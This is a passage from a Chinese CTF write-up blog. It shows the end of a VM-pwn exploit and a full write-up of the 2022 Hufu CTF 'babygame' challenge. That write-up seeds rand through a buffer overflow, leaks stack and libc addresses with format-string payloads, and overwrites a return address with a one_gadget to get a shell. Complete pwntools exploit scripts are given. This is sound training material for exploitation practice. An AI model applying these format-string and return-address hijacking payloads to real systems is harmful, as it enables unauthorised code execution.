class="number">243</span>)</span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)			<span class="comment"># this step may fail due to the ignorance of borrowed bit, but in 1/16 to fail</span></span><br><span class="line"><span class="comment"># __libc_start_main got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3FC0</span>)		<span class="comment"># this step may also fail due to same reason, 1/4 to fail until now</span></span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x2</span>)</span><br><span class="line">payload += sub(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># libc load address got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3B31</span>)</span><br><span class="line">payload += add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0xE</span>)</span><br><span class="line">payload += add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># one_gadget address got</span></span><br><span class="line"></span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">payload += mov(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># write one_gadget address to return_addr</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for c in payload:</span></span><br><span class="line"><span class="comment"># 	print(&#x27;%02x&#x27; % c, end=&#x27; &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+] Welcome to MVA, input your code now :&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="3.png" alt="" /></p>
<p>当shell拿到之后，我们发现这种题目其实并不难，只要计算一下地址然后写入就行了。就是分析代码比较麻烦，需要明确每一种指令分别代表什么含义，找到里面的漏洞进而思考如何getshell。从这道题可以看出，vm-pwn题中最为致命的就是堆栈检查不严格，可能会产生任意地址读写漏洞，还有整型溢出问题也值得关注。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-babygame-%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-babygame-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">虎符CTF-2022 babygame 题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 23:17:50" itemprop="dateCreated datePublished" datetime="2023-02-28T23:17:50+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-03-02 17:01:33" itemprop="dateModified" datetime="2023-03-02T17:01:33+08:00">2023-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这应该是今年虎符的pwn题里面最简单的一道题了。首先要过的关就是随机数。</p>
<p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
<p>在main函数输入姓名时有一个溢出，可以溢出到种子那里将种子修改。这样后面的结果就不会变了。用C语言写一个程序跑一下出结果。如下为脚本片段：</p>
<p><img src="1.png" alt="" /></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input your name:&#x27;</span>, <span class="string">b&#x27;1234567890&#x27;</span> * <span class="number">26</span> + <span class="string">b&#x27;aaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">srand = <span class="number">0x30393837</span></span><br><span class="line"></span><br><span class="line">answer = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">		  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">		  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>,</span><br><span class="line">		  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>,</span><br><span class="line">		  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, </span><br><span class="line">		  <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, </span><br><span class="line">		  <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line">		  <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, </span><br><span class="line">		  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, </span><br><span class="line">		  <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;round&#x27;</span>, <span class="built_in">str</span>(answer[i]).encode())</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Failed in &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>注意这里为什么输入name时要输入这个，我们将0x30393837作为种子，之后的部分用于填充栈内容，在b’aaaa’之后实际上就是canary了，我们之后不准备返回到这个位置，因此这个canary可以覆盖。覆盖之后程序输出时会将canary剩下的内容连带着后面的rbp一同输出，这样我们就能够获取栈的地址了。</p>
<p>在这之后会进入一个函数（以下称为vuln函数），里面有一个格式化字符串漏洞。</p>
<p>我们使用的libc版本与题目的版本相同，均为2.31。可以看到main函数的返回地址为__libc_start_main+243，我们可以使用格式化字符串漏洞将这个地址泄露出来。但是这里由于只有一个printf，在泄露之后还需要进行其他操作才有可能getshell，因此还需要将函数的返回地址修改一下。从IDA可以看到vuln函数的返回地址为0x1543，需要将其修改，如果能够再次进入vuln函数是最好。但是vuln函数的起始地址为0x13FB，如果将返回地址直接修改为vuln函数的起始地址，意味着我们需要修改返回地址最后两个字节。这就又会造成一个问题：倒数第二个字节的高4位无法确定。由页对齐我们可以修改最低12位，但同时这样修改会附带修改往上4位。这里成功率仅为1/16。理论上可以实现，但是还有没有更好的办法了呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001539                 mov     eax, 0</span><br><span class="line">.text:000000000000153E                 call    vuln</span><br><span class="line">.text:0000000000001543</span><br><span class="line">.text:0000000000001543 loc_1543:                               ; CODE XREF: main+D2↑j</span><br><span class="line">.text:0000000000001543                 mov     eax, 0</span><br><span class="line">.text:0000000000001548                 mov     rcx, [rbp+var_18]</span><br></pre></td></tr></table></figure>
<p>答案当然是肯定的。我们不一定非得把返回地址改成vuln的起始地址，改成调用vuln函数的地址不也行吗，刚好上面就是调用call指令，我们只需要修改最低1字节为3E就可以返回到153E，然后直接call再次进入。这样的话，字符串的前面一部分就是%62c%8$hhn，后面跟%79$p或%79$llx获取到__libc_start_main+243的地址和返回地址指针。这是第一轮格式化字符串漏洞注入。为了确保对齐，在’%79$p’前面加上一个’a’。</p>
<p><img src="2.png" alt="" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(b&#x27;Good luck to you.&#x27;, </span><br><span class="line">	b&#x27;%62c%8$hhna%79$p&#x27; + p64(stack_addr - 0x218))</span><br></pre></td></tr></table></figure>
<p>注入之后，程序会返回libc的偏移地址。</p>
<p>然后我们进行第二次格式化字符串注入。通过gdb调试知道第二次注入和第一次注入时返回地址所在的位置是一样的。我们就可以套用这个地址。</p>
<p>使用one_gadget工具获取到这个版本中一共有3个one_gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xe3b2e execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b31 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b34 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure>
<p>我们逐一尝试。</p>
<p>我一开始使用LibcSearcher查偏移，发现都不行，用ELF.symbols直接解析本机libc文件就可以。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babygame&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input your name:&#x27;</span>, <span class="string">b&#x27;1234567890&#x27;</span> * <span class="number">26</span> + <span class="string">b&#x27;aaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello, &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">260</span> + <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">srand = <span class="number">0x30393837</span></span><br><span class="line"></span><br><span class="line">answer = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">		  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">		  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>,</span><br><span class="line">		  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>,</span><br><span class="line">		  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, </span><br><span class="line">		  <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, </span><br><span class="line">		  <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line">		  <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, </span><br><span class="line">		  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, </span><br><span class="line">		  <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;round&#x27;</span>, <span class="built_in">str</span>(answer[i]).encode())</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Failed in &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Good luck to you.&#x27;</span>, </span><br><span class="line">	<span class="string">b&#x27;%62c%8$hhna%79$p&#x27;</span> + p64(stack_addr - <span class="number">0x218</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>).decode(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">libc_addr -= <span class="number">243</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_addr)</span></span><br><span class="line">Libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># base = libc_addr - Libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line">base = libc_addr - Libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libc_system_addr = Libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">mem_system_addr = base + libc_system_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr - <span class="number">0x218</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xE3B2E</span> + base, <span class="number">0xE3B31</span> + base, <span class="number">0xE3B34</span> + base]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;stack_addr - <span class="number">0x218</span>: one_gadget[<span class="number">1</span>]&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Good luck to you.&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="3.png" alt="" /></p>
<p>这道题看似简单，实际上细节还是比较多的。如果做题做的不多的话很容易在一些地方就卡住了。因此后面还是多做题为妙。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">157</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">1.4m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">21:53</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
